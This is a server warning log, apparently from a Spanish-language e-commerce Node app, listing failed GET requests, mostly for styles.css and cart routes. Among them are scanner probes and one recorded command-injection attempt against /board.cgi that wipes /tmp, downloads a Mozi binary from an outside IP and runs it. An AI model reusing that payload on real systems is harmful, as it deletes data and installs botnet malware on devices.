{"level":"warn","message":"Ruta /aaaa no encontrada con método: GET"}
{"level":"warn","message":"Ruta /randoms no encontrada con método: GET"}
{"level":"warn","message":"Ruta /favicon.ico no encontrada con método: GET"}
{"level":"warn","message":"Ruta /cgi-bin/downloadFlile.cgi no encontrada con método: GET"}
{"level":"warn","message":"Ruta /favicon.ico no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /cgi-bin/downloadFlile.cgi no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta http://ip-api.com/json/ no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /b@b.com no encontrada con método: GET"}
{"level":"warn","message":"Ruta /favicon.ico no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /[object%20Object] no encontrada con método: GET"}
{"level":"warn","message":"Ruta /[object%20Object] no encontrada con método: GET"}
{"level":"warn","message":"Ruta /[object%20Object] no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /[object%20Object] no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /securityRealm/user/admin/search/index?q=a no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /organics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /inorganics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /organics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /organics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /organics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /inorganics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /organics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /organics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /organics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /cart no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /cart/63f555d21f4bdec0a41fd5c5 no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta http://ip-api.com/json/ no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /cgi-bin/downloadFlile.cgi no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /favicon.ico no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /favicon.ico no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /cart/63e9747c9ffb87b97abb6da5 no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /checkout? no encontrada con método: GET"}
{"level":"warn","message":"Ruta /checkout? no encontrada con método: GET"}
{"level":"warn","message":"Ruta /checkout no encontrada con método: GET"}
{"level":"warn","message":"Ruta /checkout? no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /config/getuser?index=0 no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /favicon.ico no encontrada con método: GET"}
{"level":"warn","message":"Ruta http://ip-api.com/json/ no encontrada con método: GET"}
{"level":"warn","message":"Ruta /favicon.ico no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /config/getuser?index=0 no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /favicon.ico no encontrada con método: GET"}
{"level":"warn","message":"Ruta /aaaaa no encontrada con método: GET"}
{"level":"warn","message":"Ruta /organics no encontrada con método: GET"}
{"level":"warn","message":"Ruta /profile no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta / no encontrada con método: GET"}
{"level":"warn","message":"Ruta /get no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
{"level":"warn","message":"Ruta / no encontrada con método: GET"}
{"level":"warn","message":"Ruta /api/public/uploads/file-1677103603631-66614829.png no encontrada con método: GET"}
{"level":"warn","message":"Ruta /api/public/uploads/file-1677103603631-66614829.png no encontrada con método: GET"}
{"level":"warn","message":"Ruta / no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /styles.css no encontrada con método: GET"}
{"level":"warn","message":"Ruta /a no encontrada con método: GET"}
{"level":"warn","message":"Ruta /a no encontrada con método: GET"}
{"level":"warn","message":"Ruta /a no encontrada con método: GET"}
{"level":"warn","message":"Ruta /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://101.0.35.42:59962/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron no encontrada con método: GET"}
{"level":"warn","message":"Ruta /favicon.ico no encontrada con método: GET"}
{"level":"warn","message":"Ruta /public/uploads/file-1678398034153-845768806.png no encontrada con método: GET"}
{"level":"warn","message":"Ruta /b no encontrada con método: GET"}
{"level":"warn","message":"Ruta /b no encontrada con método: GET"}
{"level":"warn","message":"Ruta /b no encontrada con método: GET"}